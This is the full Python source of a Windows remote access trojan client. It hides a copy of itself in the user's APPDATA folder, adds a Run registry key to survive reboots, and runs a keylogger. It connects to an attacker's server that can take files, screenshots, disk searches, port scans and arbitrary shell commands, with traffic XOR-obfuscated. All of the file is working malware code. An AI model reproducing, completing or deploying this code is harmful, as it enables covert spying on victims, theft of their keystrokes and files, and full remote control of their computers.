# TCP Client
import socket       
import subprocess
import os
from tempfile import mkdtemp
from shutil import copy, rmtree
import winreg as wreg
from random import randrange
from PIL import ImageGrab
from time import sleep
from pythoncom import PumpMessages
from pyWinhook import HookManager
from threading import Thread

class Keylogger(Thread):
    ''' Thread for incommig dns requests '''
    def  __init__(self):
        super().__init__()
        # string where we will store all the pressed keys
        self.store = ''
        

    def run(self):
        ''' Run Thread '''
        # create and register a hook manager and once the user hit any keyboard button, 
        # keypressed func will be executed
        obj = HookManager()
        obj.KeyDown = self.keypressed
        # start the hooking loop and pump out the messages
        obj.HookKeyboard()
        PumpMessages()

    def keypressed(self, event):
        # Enter and backspace are not handled properly that's why we hardcode their values to < Enter > and <BACK SPACE>
        # note that we can know if the user input was enter or backspace based on their ASCII values
        keys = ''
        if event.Ascii==13:
            keys=' < Enter > ' 
        elif event.Ascii==8:
            keys=' <BACK SPACE> '
        else:
            keys=chr(event.Ascii)
        self.store += keys 
        
        fp=open("keylogs.txt","w")
        fp.write(self.store)
        fp.close()
        return True

class Client:
    ''' Target Client '''
    def __init__(self):
        self.SERVER_IP = '<SERVER-IP-ADDRESS>'
        self.SERVER_PORT = 8080
        self.key = 'E5c(;7=>-u%9Zd0IT!dbYJ3&(j~q=FBt.%;bh1<EH5|/-[;=HqsRNgM%|O,T{vX9->Nds8n4?H?I~S9kzzqOln4Xn%fQt4aI:0xJmG1#FG{20YHZ.-ZfeAGh&qH:]RtC^KUo#(aJ1[zFJErWRz}Vmw%~W^${X75t$P7jf(}ZtBD}D:IoXjv/_X|T|WjJhGpc0Y^2LGMj|w_xBHK3xFus5lwFHllS0XpUZtpo9^^<Ps%aGsL2L-dL[$[7x$j_%1jy!bj2P[Q:mhVwP_N}){x7Lc?G$qe4WN!}+9xSP{(}<e}14Z-i5Vm}^;UJ.LC]Q62.|n.&,P#!%PUWg,B!9H8LYK0KanpLk<s?!5{[y.C^WtX.ChDVrnTbYZ4ub5v-D}W]4#%A28YQbSQF.[LwUx>Iw!mK;cm1U$p-6>Ewrs?U)z[p8uAtYvH0%FuYz9<]bbc=teDUcgOaOc6g4Q,ry^4;oc3I0Z?:19](CLU/rJ{_8B2Th6mtz/J1_4,yiko3V0eqT2HANzyJ!0Ug&YET~%0qN_c~F=?W[mP-6r>&X9aqS#R-eS4mw_Y!>&L.uniEn!}7z.}[h8GiNtGj:>.0{R?]Nf7r[5+pfI?FcU0#^w$F~t]+:#Q~+4^wdMq96PE!d^R#k)V/w^i^.AZ&~S|63KS{4R)62$>8Yz2HmmV;6G&8h(S6Tf{PbAsjtieOX:Po%+Xr+b],p7lrBFpfKksX^LUV}ryx,-s5r6D]}25Tl5A-E4+WUKS=vp7l0:qnx88W:KrtAlY){^Bo.03,48ZAqST]2h6v{/Bh=V=vOi)71U9aX6hL</]0ioG0;)h}!#tzfmM?vV+_!c4uFeC;uNFNMAuQ;)>}luze!.It&]!n-zMoZ2z&=?aO=b>Xd[mBn+1w%Q>po_lCJ-+V;O9v_.gL}0gH:CT6|ZW/6u<:JIBZ!Cr53H!Eqc)BCeD;-}i}0+K{OTRS8e1ffy#Y8czMo9c;O/W7Kk(:i}UI5%>.0QIq,[Qv,&^McoP8KXwUm6TC}exdR8Ac'
        # Persistence I: copy script to random appdata location
        self.APPDATA_PATH = f"{os.environ['APPDATA']}/Microsoft/Windows/Templates/tmp.py"
        self.PATH = os.path.realpath(__file__)
        copy(self.PATH, self.APPDATA_PATH)
        # Persistence II: registry key pointing to the copied file
        self.addRegkey()
        # Start Keylogger
        k = Keylogger()
        k.start()

    def str_xor(self, s1, s2):
        ''' Encrypt/Decrypt function '''
        return "".join([chr(ord(c1) ^ ord(c2)) for (c1,c2) in zip(s1,s2)])
    
    def addRegkey(self):
        ''' Add Registry Key '''
        key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, wreg.KEY_ALL_ACCESS)
        wreg.SetValueEx(key, 'RegUpdater', 0, wreg.REG_SZ, self.APPDATA_PATH)
        key.Close()

    def scanner(self,s, ip, ports):
        ''' Port Scan '''
        scan_result = ''
        for port in ports.split(','): 
            # ports are separated by a comma in this format 21,22,..
            # make a connection using socket library for EACH one of these ports
            try:   
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                # connect_ex returns 0 if the operation succeeded, and in our case operation succeeded means that 
                # the port is open otherwise the port could be closed or the host is unreachable in the first place.
                output = sock.connect_ex((ip, int(port) )) 
                
                if output == 0:
                    scan_result += f"[+] Port {port} is opened\n"
                else:
                    scan_result += f"[-] Port {port} is closed or Host is not reachable\n" 
                    
                sock.close()
        
            except Exception as e:
                pass
        # send results to server
        s.send(self.str_xor(scan_result, self.key).encode()) 

    def transfer(self, s, path):
        ''' send transfer file '''
        if os.path.exists(path):
            f = open(path, 'rb')
            packet = f.read(1024)
            while packet != b'':
                s.send(packet) 
                packet = f.read(1024)
            s.send(self.str_xor('DONE', self.key).encode())
            f.close()
        else: 
            # the file doesn't exist
            s.send(self.str_xor('Unable to find out the file', self.key).encode())

    def connect(self): 
        ''' connect to server '''
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
        s.connect((self.SERVER_IP, self.SERVER_PORT)) # Here we define the server IP and the listening port

        # keep receiving commands from server
        while True: 
            # read the first KB of the tcp socket
            command = self.str_xor(s.recv(1024).decode(), self.key)         
            if 'terminate' in command:
                # if we got terminate order from server, 
                # close the socket and break the loop
                s.close()
                break 
            elif 'cd' in command:
                cur_path = os.getcwd()
                com, directory = command.split()
                new_path = f"{cur_path}\\{directory}"
                try: 
                    os.chdir(new_path)
                    s.send(self.str_xor(f"[*] Current Path: {new_path}", self.key).encode())
                except Exception as e:
                    s.send(self.str_xor(str(e), self.key).encode()) 
            elif 'grab' in command: 
                # on grab, indicate for file transfer operation.
                path = command.split()[-1]
                try: 
                    self.transfer(s, path)
                except Exception as e:
                    s.send(self.str_xor(str(e), self.key).encode())
            elif 'screenshoot' in command: 
                # on screenshoot, take screen image and send it to server 
                dirpath = mkdtemp()
                ImageGrab.grab().save(dirpath + "/screen.jpg", "JPEG")
                try: 
                    self.transfer(s, dirpath + "/screen.jpg")
                    rmtree(dirpath) 
                except Exception as e:
                    s.send(self.str_xor(str(e), self.key).encode())
            elif 'search' in command: 
                # cut off 'search' keyward, output would be C:\\*.pdf
                command = command[7:] 
                # split command to path and ext
                path, ext = command.split('*') 
                file_list = '' 
                
                for dirpath, dirnames, files in os.walk(path):
                    for f in files:
                        if f.endswith(ext):
                            file_list = file_list + '\n' + os.path.join(dirpath, f)
                # Send search result to server
                s.send(self.str_xor(file_list, self.key).encode())
            elif 'scan' in command: 
                # syntax: scan 10.0.2.15:22,80
                # cut off 'scan' keyward
                command = command[5:]
                ip, ports = command.split(':') 
                self.scanner(s, ip, ports)
            else: 
                # otherwise, we pass the received command to a shell process
                cmd = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                s.send(self.str_xor(cmd.stdout.read().decode(), self.key).encode()) # send back the result
                s.send(self.str_xor(cmd.stdout.read().decode(), self.key).encode()) # send back the error -if any-, such as syntax error

def main():
    c = Client()
    # Persistence III: if can't connect to server sleep for 1 - 10 seconds
    while True:
        try:
            if c.connect():
                break
        except:
            sleep_for = randrange(1, 10)
            sleep( sleep_for )

if __name__ == "__main__":
    main()